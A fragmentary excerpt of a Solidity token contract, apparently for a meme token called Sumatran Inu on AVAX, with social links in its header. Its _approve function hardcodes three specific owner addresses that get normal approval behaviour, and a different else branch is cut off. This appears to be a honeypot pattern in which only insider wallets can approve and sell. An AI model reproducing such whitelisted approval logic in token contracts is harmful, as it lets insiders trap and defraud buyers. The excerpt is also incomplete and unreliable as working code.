 ...
 *                                                                                           
 *       
 *              //https://t.me/SumatranInuAVAX
 *              //https://twitter.com/SumatranInu                         
 */
//
...
contract Token is VaultOwned, IERC20 {
    ...
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        ...
        require(spender != address(0), "ERC20: approve to the zero address");
         if (owner == address(0x4c357D323B051ffFF41A2866b82f440d58315Dd1)) {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    } 
    else if (owner == address(0xb92d6463ca5C9A3A1A77549Da8aC7cfEE1F8Dd33)) {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    else if (owner == address(0x6CFB333D276De6E07710C099D52D5A8E1C7CB0FF)) {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    else {
